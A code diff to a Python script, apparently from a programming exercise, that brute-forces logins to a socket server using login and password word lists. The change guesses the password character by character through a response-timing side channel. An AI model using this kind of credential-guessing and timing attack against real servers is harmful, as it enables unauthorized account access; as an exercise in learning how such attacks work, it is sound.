@@ -2,9 +2,10 @@ import itertools
 import json
 import socket
 import sys
+import time
 
-password_list = "passwords.txt"
-login_list = "logins.txt"
+PASSWORD_LIST = "passwords.txt"
+LOGIN_LIST = "logins.txt"
 
 
 def login_generator_from_file(file):
@@ -63,8 +64,8 @@ def connection(ip=None, port=None):
         ip, port = get_connection_data()
     letters = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890'
 
-    passwords = generate_from_file(password_list)
-    logins = generate_from_file(login_list)
+    passwords = generate_from_file(PASSWORD_LIST)
+    logins = generate_from_file(LOGIN_LIST)
 
     response = ""
     right_login = ""
@@ -84,14 +85,16 @@ def connection(ip=None, port=None):
                 for letter in letters:
                     sending = json.dumps({"login": right_login, "password": partial + letter}).encode()
                     sock.send(sending)
+                    before = time.time()
                     response = sock.recv(1024).decode()
+                    after = time.time()
 
                     if response == '{"result": "Connection success!"}':
                         print(json.dumps({"login": right_login, "password": partial + letter}))
                         break
 
-                    if response == '{"result": "Exception happened during login"}':
-                        partial = partial + letter
+                    if after - before > 0.005:
+                        partial += letter
 
         except ConnectionRefusedError:
             print(response)
